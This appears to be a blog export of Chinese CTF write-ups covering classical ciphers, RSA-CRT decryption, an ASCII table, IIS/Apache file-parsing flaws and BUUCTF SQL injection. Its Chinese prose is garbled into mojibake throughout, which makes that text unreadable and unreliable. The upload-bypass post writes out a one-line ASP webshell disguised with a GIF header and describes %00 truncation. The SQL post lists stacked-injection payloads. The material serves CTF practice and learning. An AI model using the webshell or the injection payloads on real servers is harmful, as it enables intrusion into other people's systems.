<h3 id="åº”ç”¨"><a href="#åº”ç”¨" class="headerlink" title="åº”ç”¨"></a>åº”ç”¨</h3><p>ã€€ã€€ä¸­æ–‡ç”µç å¯ç”¨ä½œç”µè„‘é‡Œçš„ä¸­æ–‡è¾“å…¥æ³•ï¼Œä½†å› ä¸­æ–‡ç”µç æ˜¯â€œæ— ç†ç â€ï¼Œè®°å¿†å›°éš¾ï¼Œä¸€èˆ¬ç”¨æˆ·å‡ ä¹æ— æ³•ç†Ÿç»ƒåœ°æŒæ¡ä½¿ç”¨ã€‚<br>ã€€ã€€åœ¨é¦™æ¸¯ï¼Œæ¯ä¸ªæœ‰ä¸­æ–‡å§“åçš„å¸‚æ°‘çš„èº«ä»½è¯ä¸Šï¼Œå‡ä¼šåœ¨ä»–çš„å§“åä¸‹é¢ï¼Œå°æœ‰ä¸­æ–‡ç”µç ï¼Œå¤–å›½äººå–å¾—çš„å…¥æ¸¯ç­¾è¯äº¦æœ‰å°ä¸Šã€‚åœ¨å¾ˆå¤šæ”¿åºœæˆ–å•†ä¸šæœºæ„çš„è¡¨æ ¼ä¸­ï¼Œéƒ½ä¼šè¦æ±‚å¡«å†™è€…å¡«å†™ä»–çš„ä¸­æ–‡ç”µç ï¼Œä»¥ä¾¿è¾“å…¥ç”µè„‘ã€‚<br>ã€€ã€€ç¾å›½ç­¾è¯ç”³è¯·è¡¨ï¼ˆDS-160è¡¨ï¼‰ä¸­ï¼Œè¦æ±‚ç”³è¯·äººå¡«å†™å§“åçš„ä¸­æ–‡ç”µç ï¼Œä¸€äº›ç”Ÿåƒ»å­—æ²¡æœ‰å¯¹åº”çš„ä¸­æ–‡ç”µç æ—¶ï¼Œå¯ç”¨â€œ0000â€ä»£æ›¿ã€‚</p>
<h3 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h3><p>ã€€ã€€ä¸­æ–‡ç”µç è¡¨é‡‡ç”¨äº†å››ä½é˜¿æ‹‰ä¼¯æ•°å­—ä½œä»£å·ï¼Œä»0001åˆ°9999æŒ‰å››ä½æ•°é¡ºåºæ’åˆ—ï¼Œç”¨å››ä½æ•°å­—è¡¨ç¤ºæœ€å¤šä¸€ä¸‡ä¸ªæ±‰å­—ã€å­—æ¯å’Œç¬¦å·ã€‚æ±‰å­—å…ˆæŒ‰éƒ¨é¦–ï¼ŒåæŒ‰ç¬”åˆ’æ’åˆ—ã€‚å­—æ¯å’Œç¬¦å·æ”¾åˆ°ç”µç è¡¨çš„æœ€å°¾ã€‚åæ¥ç”±äºä¸€ä¸‡ä¸ªæ±‰å­—ä¸è¶³ä»¥åº”ä»˜æˆ·ç±ç®¡ç†çš„è¦æ±‚ï¼Œåˆæœ‰ç¬¬äºŒå­—é¢æ±‰å­—çš„å‡ºç°ã€‚åœ¨é¦™æ¸¯ï¼Œä¸¤ä¸ªå­—é¢éƒ½é‡‡ç”¨åŒä¸€ç¼–ç ï¼Œç”±è¾“å…¥å‘˜äººæ‰‹é€‰æ‹©å­—é¢ï¼›åœ¨å°æ¹¾ï¼Œç¬¬äºŒå­—é¢çš„æ±‰å­—ä¼šåœ¨å¼€é¦–è¡¥ä¸Šâ€œ1â€å­—ï¼Œå˜æˆ5ä¸ªæ•°å­—çš„ç¼–ç ã€‚</p>
<p>å¯†æ–‡ï¼š<strong>606046152623600817831216121621196386</strong><br><a href="https://dianma.bmcx.com/">ä¸­æ–‡ç”µç æŸ¥è¯¢</a></p>
<h2 id="å‡¯æ’’ï¼Ÿæ›¿æ¢ï¼Ÿå‘µå‘µ"><a href="#å‡¯æ’’ï¼Ÿæ›¿æ¢ï¼Ÿå‘µå‘µ" class="headerlink" title="å‡¯æ’’ï¼Ÿæ›¿æ¢ï¼Ÿå‘µå‘µ!"></a>å‡¯æ’’ï¼Ÿæ›¿æ¢ï¼Ÿå‘µå‘µ!</h2><p><strong>MTHJ{CUBCGXGUGXWREXIPOYAOEYFIGXWRXCHTKHFCOHCFDUCGTXZOHIXOEOWMEHZO}</strong> æ³¨æ„ï¼šå¾—åˆ°çš„ flag è¯·åŒ…ä¸Š flag{} æäº¤, flag{å°å†™å­—æ¯}<br>MTHJæ˜æ˜¾å¯¹åº”flagï¼Œ<a href="https://quipqiup.com/">quipqiup-cryptoquipå’Œè§£å¯†</a><br><img src="https://img-blog.csdnimg.cn/b4fc789dba9a46a3a8ba4f652d38fa30.png" alt="1"><br>å¾—åˆ°æ˜æ–‡è½¬æ¢ä¸ºå°å†™å»æ‰ç©ºæ ¼å°±è¡Œäº†</p>
<h2 id="èŒèŒå“’çš„å…«æˆ’-çŒªåœˆå¯†ç "><a href="#èŒèŒå“’çš„å…«æˆ’-çŒªåœˆå¯†ç " class="headerlink" title="èŒèŒå“’çš„å…«æˆ’  (çŒªåœˆå¯†ç )"></a>èŒèŒå“’çš„å…«æˆ’  (çŒªåœˆå¯†ç )</h2><p><img src="https://img-blog.csdnimg.cn/02203a19c57a41a38b98cea954fd1819.png" alt="1"><br>çŒªåœˆå¯†ç <a href="http://www.metools.info/code/c90.html">è§£å¯†</a><br><img src="https://img-blog.csdnimg.cn/0a53834bfbea4db2a0476a2124c505ea.png" alt="1"></p>
<h2 id="ä¼ ç»ŸçŸ¥è¯†-å¤å…¸å¯†ç "><a href="#ä¼ ç»ŸçŸ¥è¯†-å¤å…¸å¯†ç " class="headerlink" title="ä¼ ç»ŸçŸ¥è¯†+å¤å…¸å¯†ç "></a>ä¼ ç»ŸçŸ¥è¯†+å¤å…¸å¯†ç </h2><blockquote>
<p>å°æ˜æŸä¸€å¤©æ”¶åˆ°ä¸€å°å¯†ä¿¡ï¼Œä¿¡ä¸­å†™äº†å‡ ä¸ªä¸åŒçš„å¹´ä»½<br>       <strong>è¾›å¯</strong>ï¼Œ<strong>ç™¸å·³</strong>ï¼Œ<strong>ä¸™æˆŒ</strong>ï¼Œ<strong>è¾›æœª</strong>ï¼Œ<strong>åºšè¾°</strong>ï¼Œ<strong>ç™¸é…‰</strong>ï¼Œ<strong>å·±å¯</strong>ï¼Œ<strong>ç™¸å·³</strong>ã€‚<br>       ä¿¡çš„èƒŒé¢è¿˜å†™æœ‰â€œ+<strong>ç”²å­</strong>â€ï¼Œè¯·è§£å‡ºè¿™æ®µå¯†æ–‡ã€‚</p>
<p>keyå€¼ï¼šCTF{XXX}</p>
</blockquote>
<h3 id="å…­åå¹´ç”²å­ï¼ˆå¹²æ”¯è¡¨ï¼‰"><a href="#å…­åå¹´ç”²å­ï¼ˆå¹²æ”¯è¡¨ï¼‰" class="headerlink" title="å…­åå¹´ç”²å­ï¼ˆå¹²æ”¯è¡¨ï¼‰"></a>å…­åå¹´ç”²å­ï¼ˆå¹²æ”¯è¡¨ï¼‰</h3><p><img src="https://img-blog.csdnimg.cn/f5fd3210364043a487187ee5536630fd.png" alt="1"><strong>ä¸€ç”²å­ä¸º60å¹´</strong></p>
<p>è¾›å¯ï¼Œé¡ºåºä¸ºç¬¬28ä¸ª + ç”²å­(60) â€“&gt; 88 â€“&gt; X<br>ç™¸å·³ï¼Œé¡ºåºä¸ºç¬¬30ä¸ª + ç”²å­(60) â€“&gt; 90 â€“&gt; Z<br>ä¸™æˆŒï¼Œé¡ºåºä¸ºç¬¬23ä¸ª + ç”²å­(60) â€“&gt; 93 â€“&gt; S<br>è¾›æœªï¼Œé¡ºåºä¸ºç¬¬8ä¸ª + ç”²å­(60) â€“&gt; 68 â€“&gt; D<br>åºšè¾°ï¼Œé¡ºåºä¸ºç¬¬17ä¸ª + ç”²å­(60) â€“&gt; 77 â€“&gt; M<br>ç™¸é…‰ï¼Œé¡ºåºä¸ºç¬¬10ä¸ª + ç”²å­(60) â€“&gt; 70 â€“&gt; F<br>å·±å¯ï¼Œé¡ºåºä¸ºç¬¬16ä¸ª + ç”²å­(60) â€“&gt; 76 â€“&gt; L<br>ç™¸å·³ï¼Œé¡ºåºä¸ºç¬¬30ä¸ª + ç”²å­(60) â€“&gt; 90 â€“&gt; Z</p>
<p><strong>XZSDMFLZ</strong><br>çœ‹äº†ä¸‹writeupï¼š<br>å…ˆæ …æ ï¼Œåå‡¯æ’’ï¼š</p>
<blockquote>
<p>æ …æ fenceè§£ç :		<br>å› æ•°[2, 4]:<br>åˆ†ä¸º2æ æ—¶ï¼Œè§£å¯†ç»“æœä¸ºï¼šXMZFSLDZ<br>åˆ†ä¸º4æ æ—¶ï¼Œè§£å¯†ç»“æœä¸ºï¼šXSMLZDFZ</p>
</blockquote>
<p>ç„¶ååˆ†åˆ«è§£å¯†<br>å‡¯æ’’Caesarè§£ç :		<br>key #0: XMZFSLDZ<br>key #1: WLYERKCY<br>key #2: VKXDQJBX<br>key #3: UJWCPIAW<br>key #4: TIVBOHZV<br>key #5: <strong>SHUANGYU</strong><br>key #6: RGTZMFXT<br>key #7: QFSYLEWS<br>key #8: PERXKDVR<br>key #9: ODQWJCUQ<br>key #10: NCPVIBTP<br>key #11: MBOUHASO<br>key #12: LANTGZRN<br>key #13: KZMSFYQM<br>key #14: JYLREXPL<br>key #15: IXKQDWOK<br>key #16: HWJPCVNJ<br>key #17: GVIOBUMI<br>key #18: FUHNATLH<br>key #19: ETGMZSKG<br>key #20: DSFLYRJF<br>key #21: CREKXQIE<br>key #22: BQDJWPHD<br>key #23: APCIVOGC<br>key #24: ZOBHUNFB<br>key #25: YNAGTMEA</p>
<p>å‡¯æ’’Caesarè§£ç :		<br>key #0: XSMLZDFZ<br>key #1: WRLKYCEY<br>key #2: VQKJXBDX<br>key #3: UPJIWACW<br>key #4: TOIHVZBV<br>key #5: SNHGUYAU<br>key #6: RMGFTXZT<br>key #7: QLFESWYS<br>key #8: PKEDRVXR<br>key #9: OJDCQUWQ<br>key #10: NICBPTVP<br>key #11: MHBAOSUO<br>key #12: LGAZNRTN<br>key #13: KFZYMQSM<br>key #14: JEYXLPRL<br>key #15: IDXWKOQK<br>key #16: HCWVJNPJ<br>key #17: GBVUIMOI<br>key #18: FAUTHLNH<br>key #19: EZTSGKMG<br>key #20: DYSRFJLF<br>key #21: CXRQEIKE<br>key #22: BWQPDHJD<br>key #23: AVPOCGIC<br>key #24: ZUONBFHB<br>key #25: YTNMAEGA</p>
<p><strong>flag{SHUANGYU}</strong></p>
<h2 id="RSA1"><a href="#RSA1" class="headerlink" title="RSA1"></a>RSA1</h2><blockquote>
<p>p &#x3D; 8637633767257008567099653486541091171320491509433615447539162437911244175885667806398411790524083553445158113502227745206205327690939504032994699902053229<br>q &#x3D; 12640674973996472769176047937170883420927050821480010581593137135372473880595613737337630629752577346147039284030082593490776630572584959954205336880228469<br>dp &#x3D; 6500795702216834621109042351193261530650043841056252930930949663358625016881832840728066026150264693076109354874099841380454881716097778307268116910582929<br>dq &#x3D; 783472263673553449019532580386470672380574033551303889137911760438881683674556098098256795673512201963002175438762767516968043599582527539160811120550041<br>c &#x3D; 24722305403887382073567316467649080662631552905960229399079107995602154418176056335800638887527614164073530437657085079676157350205351945222989351316076486573599576041978339872265925062764318536089007310270278526159678937431903862892400747915525118983959970607934142974736675784325993445942031372107342103852</p>
</blockquote>
<p>å…ˆæ‘†å‡ºå·²çŸ¥æ¡ä»¶ï¼š</p>
<blockquote>
<p>c â‰¡ m e m o d n câ‰¡m^{e} mod n câ‰¡memodn m â‰¡ c d m o d n mâ‰¡c^{d} mod n<br>mâ‰¡cdmodn Ï• ( n ) &#x3D; ( p âˆ’ 1 ) âˆ— ( q âˆ’ 1 ) Ï•(n)&#x3D;(pâˆ’1)âˆ—(qâˆ’1)<br>Ï•(n)&#x3D;(pâˆ’1)âˆ—(qâˆ’1) d âˆ— e â‰¡ 1 m o d Ï• ( n ) dâˆ—eâ‰¡1 mod Ï•(n) dâˆ—eâ‰¡1modÏ•(n) d<br>p â‰¡ d m o d ( p âˆ’ 1 ) dpâ‰¡d mod (pâˆ’1) dpâ‰¡dmod(pâˆ’1) d q â‰¡ d m o d ( q âˆ’<br>1 ) dqâ‰¡d mod (qâˆ’1) dqâ‰¡dmod(qâˆ’1)</p>
</blockquote>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> libnum
<span class="token keyword">def</span> <span class="token function">egcd</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>b <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> a
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        x<span class="token punctuation">,</span> y<span class="token punctuation">,</span> q <span class="token operator">=</span> egcd<span class="token punctuation">(</span>b<span class="token punctuation">,</span> a <span class="token operator">%</span> b<span class="token punctuation">)</span>  <span class="token comment"># q = GCD(a, b) = GCD(b, a%b)</span>
        x<span class="token punctuation">,</span> y <span class="token operator">=</span> y<span class="token punctuation">,</span> <span class="token punctuation">(</span>x <span class="token operator">-</span> <span class="token punctuation">(</span>a <span class="token operator">//</span> b<span class="token punctuation">)</span> <span class="token operator">*</span> y<span class="token punctuation">)</span>
        <span class="token keyword">return</span> x<span class="token punctuation">,</span> y<span class="token punctuation">,</span> q

<span class="token keyword">def</span> <span class="token function">mod_inv</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> egcd<span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">%</span> b  <span class="token comment"># æ±‚aæ¨¡bå¾—é€†</span>

p <span class="token operator">=</span> <span class="token number">8637633767257008567099653486541091171320491509433615447539162437911244175885667806398411790524083553445158113502227745206205327690939504032994699902053229</span>
q <span class="token operator">=</span> <span class="token number">12640674973996472769176047937170883420927050821480010581593137135372473880595613737337630629752577346147039284030082593490776630572584959954205336880228469</span>
dp <span class="token operator">=</span> <span class="token number">6500795702216834621109042351193261530650043841056252930930949663358625016881832840728066026150264693076109354874099841380454881716097778307268116910582929</span>
dq <span class="token operator">=</span> <span class="token number">783472263673553449019532580386470672380574033551303889137911760438881683674556098098256795673512201963002175438762767516968043599582527539160811120550041</span>
c <span class="token operator">=</span> <span class="token number">24722305403887382073567316467649080662631552905960229399079107995602154418176056335800638887527614164073530437657085079676157350205351945222989351316076486573599576041978339872265925062764318536089007310270278526159678937431903862892400747915525118983959970607934142974736675784325993445942031372107342103852</span>

invq<span class="token operator">=</span>mod_inv<span class="token punctuation">(</span>p<span class="token punctuation">,</span>q<span class="token punctuation">)</span>
mp<span class="token operator">=</span><span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span>dp<span class="token punctuation">,</span>p<span class="token punctuation">)</span>
mq<span class="token operator">=</span><span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span>dq<span class="token punctuation">,</span>q<span class="token punctuation">)</span>
m<span class="token operator">=</span><span class="token punctuation">(</span><span class="token punctuation">(</span>mp<span class="token operator">-</span>mq<span class="token punctuation">)</span><span class="token operator">*</span>invq<span class="token operator">%</span>p<span class="token punctuation">)</span><span class="token operator">*</span>q<span class="token operator">+</span>mq
<span class="token keyword">print</span><span class="token punctuation">(</span>libnum<span class="token punctuation">.</span>n2s<span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>å¾—åˆ°<strong>noxCTF{W31c0m3_70_Ch1n470wn}</strong></p>
]]></content>
      <categories>
        <category>crypto</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>ASCIIç å¯¹åº”è¡¨</title>
    <url>/2023/01/09/ASCII%E7%A0%81%E5%AF%B9%E5%BA%94%E8%A1%A8/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p> <strong>chr(9) tabç©ºæ ¼    chr(10) æ¢è¡Œ   chr(13) å›è½¦    Chr(13)&amp;chr(10)  å›è½¦æ¢è¡Œ    chr(32) ç©ºæ ¼ç¬¦    chr(34) åŒå¼•å·    chr(39) å•å¼•å·</strong></p>
<p> <strong>chr(33) !    chr(34) â€œ    chr(35) #    chr(36) $    chr(37)  %    chr(38) &amp;    chr(39) â€˜    chr(40) (    chr(41)  )    chr(42) *<br> chr(43) +    chr(44) ,    chr(45) -    chr(46) .    chr(47) &#x2F;</strong></p>
<p> Chr(48) 0    Chr(49) 1    Chr(50) 2    Chr(51) 3     Chr(52) 4    Chr(53) 5    Chr(54) 6    Chr(55) 7     Chr(56) 8    Chr(57) 9</p>
<p> <strong>chr(58)      chr(59) ;    chr(60) &lt;    chr(61) &#x3D;    chr(62) &gt;    chr(63) ?    chr(64) @</strong></p>
<p> chr(65) A    chr(66) B    chr(67) C    chr(68) D     chr(69) E    chr(70) F    chr(71) G    chr(72) H      chr(73) I     chr(74) J<br> chr(75) K    chr(76) L     chr(77) M    chr(78) N    chr(79) O    chr(80) P     chr(81) Q    chr(82) R    chr(83) S    chr(84) T<br> chr(85) U    chr(86) V    chr(87) W    chr(88) X    chr(89) Y    chr(90) Z</p>
<p> <strong>chr(91) [    chr(92) \    chr(93) ]    chr(94) ^    chr(95) _    chr(96) &#96;</strong></p>
<p> chr(97) a    chr(98) b    chr(99) c    chr(100) d     chr(101) e    chr(102) f    chr(103) g    chr(104) h     chr(105) i<br> chr(106) j    chr(107) k    chr(108) l     chr(109) m    chr(110) n    chr(111) o    chr(112) p     chr(113) q    chr(114) r<br> chr(115) s    chr(116) t     chr(117) u    chr(118) v    chr(119) w    chr(120) x     chr(121) y    chr(122) z</p>
<p> <strong>chr(123) {    chr(124) |    chr(125) }    chr(126) ~     chr(127)     chr(128)     chr(153)â„¢    chr(169) Â©      chr(174)</strong> Â®</p>
]]></content>
      <categories>
        <category>çŸ¥è¯†ç‚¹</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>æ–‡ä»¶è§£æï¼Œæ–‡ä»¶å¤´æ¬ºéª—</title>
    <url>/2023/01/05/%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90%EF%BC%8C%E6%96%87%E4%BB%B6%E5%A4%B4%E6%AC%BA%E9%AA%97/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><meta name="referrer" content="no-referrer"/>

<h1 id="æ–‡ä»¶è§£ææ¼æ´â€”â€”"><a href="#æ–‡ä»¶è§£ææ¼æ´â€”â€”" class="headerlink" title="æ–‡ä»¶è§£ææ¼æ´â€”â€”"></a>æ–‡ä»¶è§£ææ¼æ´â€”â€”</h1><p>è§£ææ¼æ´ä¸»è¦è¯´çš„æ˜¯ä¸€äº›ç‰¹æ®Šæ–‡ä»¶è¢«iisï¼Œapacheï¼Œnginxåœ¨æŸç§æƒ…å†µä¸‹è§£é‡Šæˆè„šæœ¬æ–‡ä»¶æ ¼å£«çš„æ¼æ´ã€‚</p>
<h2 id="Iisè§£ææ¼æ´"><a href="#Iisè§£ææ¼æ´" class="headerlink" title="Iisè§£ææ¼æ´"></a>Iisè§£ææ¼æ´</h2><h3 id="1-ç›®å½•è§£æ"><a href="#1-ç›®å½•è§£æ" class="headerlink" title="1.ç›®å½•è§£æ"></a>1.ç›®å½•è§£æ</h3><p>å½“ç½‘ç«™ä¸‹å»ºç«‹æ–‡ä»¶å¤¹çš„åå­—ä¸º.aspï¼Œ.asaçš„æ–‡ä»¶å¤¹ï¼Œå…¶ç›®å½•å†…çš„ä»»ä½•æ‰©å±•åçš„æ–‡ä»¶éƒ½è¢«iiså½“ä½œaspæ–‡ä»¶æ¥è§£æå¹¶æ‰§è¡Œï¼Œå¦‚åˆ›å»ºç›®å½•&#x2F;xxx.asp&#x2F;xx.jpg  xx.jpgè¢«å½“ä½œaspæ–‡ä»¶æ¥æ‰§è¡Œï¼Œå¦‚æœé»‘å®¢å¯ä»¥æ§åˆ¶æ´»ä¸Šä¼ æ–‡ä»¶å¤¹è·¯å¾„ï¼Œå°±å¯ä»¥ä¸ç®¡ä¸Šä¼ åçš„å›¾ç‰‡æ”¹ä¸æ”¹åéƒ½èƒ½æ‹¿shellã€‚</p>
<h3 id="2-ç¬¦å·åé¢ä¸è¢«è§£æâ€”â€”ï¼ˆå¯ä½¿ç”¨æŠ“åŒ…è½¯ä»¶æ”¹åç¼€ï¼‰"><a href="#2-ç¬¦å·åé¢ä¸è¢«è§£æâ€”â€”ï¼ˆå¯ä½¿ç”¨æŠ“åŒ…è½¯ä»¶æ”¹åç¼€ï¼‰" class="headerlink" title="2.ç¬¦å·åé¢ä¸è¢«è§£æâ€”â€”ï¼ˆå¯ä½¿ç”¨æŠ“åŒ…è½¯ä»¶æ”¹åç¼€ï¼‰"></a>2.ç¬¦å·åé¢ä¸è¢«è§£æâ€”â€”ï¼ˆå¯ä½¿ç”¨æŠ“åŒ…è½¯ä»¶æ”¹åç¼€ï¼‰</h3><p>åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œåˆ†å·åé¢çš„ä¸è¢«è§£æï¼Œä¹Ÿå°±æ˜¯è¯´xxx.asp;.jpgä¼šè¢«æœåŠ¡å™¨çœ‹æˆæ˜¯xxx.jpg</p>
<h2 id="Apacheè§£ææ¼æ´"><a href="#Apacheè§£ææ¼æ´" class="headerlink" title="Apacheè§£ææ¼æ´"></a>Apacheè§£ææ¼æ´</h2><p>apacheæ˜¯ä»å³åˆ°å·¦å¼€å§‹åˆ¤æ–­è§£æï¼Œå¦‚æœä¸ºä¸å¯è¯†åˆ«è§£æï¼Œå°±å†å¾€å·¦åˆ¤æ–­ï¼Œå¦‚xxx.php.owf.rar ï¼Œâ€.owfâ€å’Œâ€.rarâ€è¿™ä¸¤ç§åç¼€æ˜¯apacheè§£æä¸äº†çš„ï¼Œapacheå°±ä¼šæŠŠxxx.php.owf.rarè§£ææˆphp.</p>
<p>æ€ä¹ˆå»åˆ¤æ–­æ˜¯ä¸æ˜¯åˆæ³•çš„åç¼€å°±æ˜¯è¿™ä¸ªæ¼æ´åˆ©ç”¨å…³é”®ï¼Œæµ‹è¯•æ—¶æŠŠå¸¸è§çš„åç¼€éƒ½å†™ä¸Šï¼Œå»æµ‹è¯•æ˜¯ä¸æ˜¯åˆæ³•ï¼Œä»»æ„ä¸è¯†åˆ«çš„åç¼€ï¼Œé€çº§å‘ä¸Šè¯†åˆ«</p>
<h1 id="æ–‡ä»¶å¤´æ¬ºéª—æ¼æ´â€”â€”"><a href="#æ–‡ä»¶å¤´æ¬ºéª—æ¼æ´â€”â€”" class="headerlink" title="æ–‡ä»¶å¤´æ¬ºéª—æ¼æ´â€”â€”"></a>æ–‡ä»¶å¤´æ¬ºéª—æ¼æ´â€”â€”</h1><p>åœ¨ä¸€å¥è¯æœ¨é©¬å†…å®¹å‰é¢åŠ å…¥gif89aï¼Œå¦‚ï¼šgif89a &lt;%eval request(â€œxxâ€)%&gt; ç„¶åå°†æœ¨é©¬ä¿å­˜ä¸ºå›¾ç‰‡çš„æ ¼å¼ï¼Œå¦‚xxx.jpgï¼Œxx.gifæ–‡ä»¶å¤´æ¬ºéª—å¯ä»¥ç”¨æ¥ç»•è¿‡ç®€å•çš„wafã€‚</p>
<p> <img src="https://img-blog.csdnimg.cn/bf55298bd8f14a2d8b8d9b9813ce976b.png" alt="5"></p>
<h2 id="00æˆªæ–­â€”â€”"><a href="#00æˆªæ–­â€”â€”" class="headerlink" title="00æˆªæ–­â€”â€”"></a>00æˆªæ–­â€”â€”</h2><p>æ‰¾åˆ°ä¸Šä¼ æ¼æ´åï¼Œæ‰“å¼€é€‰æ‹©ä¸Šä¼ çš„ä¸€å¥è¯æœ¨é©¬ï¼Œæ‰“å¼€æŠ“åŒ…è½¯ä»¶ï¼Œè¿›è¡Œ00æˆªæ–­ï¼ŒæŠŠæŠ“åˆ°çš„æ•°æ®åŒ…æ”¹ä¸º%00</p>
<p><img src="https://img-blog.csdnimg.cn/7a82003694db4edcb8fbde4e1e0f3aa8.png" alt="1"></p>
<p>é€‰å–%00</p>
<p><img src="https://img-blog.csdnimg.cn/e8560e2da51d4cb28d0118f8137af159.png" alt="2"></p>
<p>å˜æˆ16è¿›åˆ¶</p>
<p> <img src="https://img-blog.csdnimg.cn/0e98b39607174575864baa6e3fb4cda2.png" alt="3"></p>
<p>æ”¾åŒ…</p>
<p><img src="https://img-blog.csdnimg.cn/2cda82f915804842b99f150d56196ea0.png" alt="4"></p>
]]></content>
      <categories>
        <category>çŸ¥è¯†ç‚¹</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>buuctf-webéƒ¨åˆ†åšé¢˜è®°å½•</title>
    <url>/2023/01/03/buuctf-web%E9%83%A8%E5%88%86%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><meta name="referrer" content="no-referrer"/>

<h2 id="SUCTF-2019-EasySQL-1"><a href="#SUCTF-2019-EasySQL-1" class="headerlink" title="[SUCTF 2019]EasySQL  1"></a>[SUCTF 2019]EasySQL  1</h2><p><img src="https://img-blog.csdnimg.cn/b565bb2a9657430992b91bbc44e7da14.png" alt="1"><br>ä¼ å…¥æ•°å­—æœ‰å›æ˜¾,å­—æ¯æ— å›æ˜¾</p>
<p><img src="https://img-blog.csdnimg.cn/f43f0672d814487e8e3ba485eec10a71.png" alt="2"><br>ä¼ å…¥1â€™æ— å›æ˜¾<br>ä¼ å…¥1â€™ or â€˜1â€™&#x3D;â€™1æœ‰æ–°çš„å›æ˜¾<br><img src="https://img-blog.csdnimg.cn/3192b758fcd640a7be33dc8f451997b2.png" alt="3"><br>å¯èƒ½å­˜åœ¨æ³¨å…¥ç‚¹<br>ä½¿ç”¨<code>1&#39; order by 4#</code>çœ‹çœ‹æœ‰å¤šå°‘åˆ—ï¼Œè¯•äº†å¾ˆå¤šæ¬¡éƒ½ä¸è¡Œã€‚è¯•è¯•å †å æ³¨å…¥<br><code>1;show databases;#</code><br><img src="https://img-blog.csdnimg.cn/d736ee3c4872469e8becd01db21751f6.png" alt="4"><br><code>1;show tables;#</code><br><img src="https://img-blog.csdnimg.cn/8948218749ff428986d236abc8a79a21.png" alt="5"><br>åé¢å°±è¿›ä¸å»äº†ï¼Œå‚è€ƒäº†å¸ˆå‚…ä»¬çš„WPï¼Œ</p>
<blockquote>
<p>select $post[â€˜queryâ€™]||flag from Flag </p>
</blockquote>
<p>è¿™æ˜¯å…³é”®è¯­å¥ï¼<br>å½“ sql_mode è®¾ç½®äº† PIPES_AS_CONCAT æ—¶ï¼Œ|| å°±æ˜¯å­—ç¬¦ä¸²è¿æ¥ç¬¦ï¼Œç›¸å½“äºCONCAT() å‡½æ•°<br>å½“ sql_mode æ²¡æœ‰è®¾ç½® PIPES_AS_CONCAT æ—¶ ï¼ˆé»˜è®¤æ²¡æœ‰è®¾ç½®ï¼‰ï¼Œ|| å°±æ˜¯é€»è¾‘æˆ–ï¼Œç›¸å½“äºORå‡½æ•°<br>æ‰€ä»¥è¦æƒ³åŠæ³•è®© || ä¸æ˜¯é€»è¾‘æˆ–ï¼Œä¿®æ”¹sql_modeä¸ºPIPES_AS_CONCATï¼Œç„¶åå†æ¬¡æŸ¥è¯¢</p>
<p><strong>è§£æ³•ä¸€</strong></p>
<blockquote>
<p>1;set sql_mode&#x3D;pipes_as_concat;select 1</p>
</blockquote>
<p>ä½¿ç”¨<code>set sql_mode=PIPES_AS_CONCAT;</code>å°†||è§†ä¸ºå­—ç¬¦ä¸²çš„è¿æ¥æ“ä½œç¬¦è€Œéæˆ–è¿ç®—ç¬¦ã€‚<br><img src="https://img-blog.csdnimg.cn/dadc8d4a66bf4ab7af9377443c126787.png" alt="6"><br><strong>è§£æ³•äºŒ</strong></p>
<blockquote>
<p>*,1</p>
</blockquote>
<h2 id="GXYCTF2019-Ping-Ping-Ping-1"><a href="#GXYCTF2019-Ping-Ping-Ping-1" class="headerlink" title="[GXYCTF2019]Ping Ping Ping 1"></a>[GXYCTF2019]Ping Ping Ping 1</h2><p>ä¸»è¦è€ƒæŸ¥<strong>å‘½ä»¤æ‰§è¡Œ</strong></p>
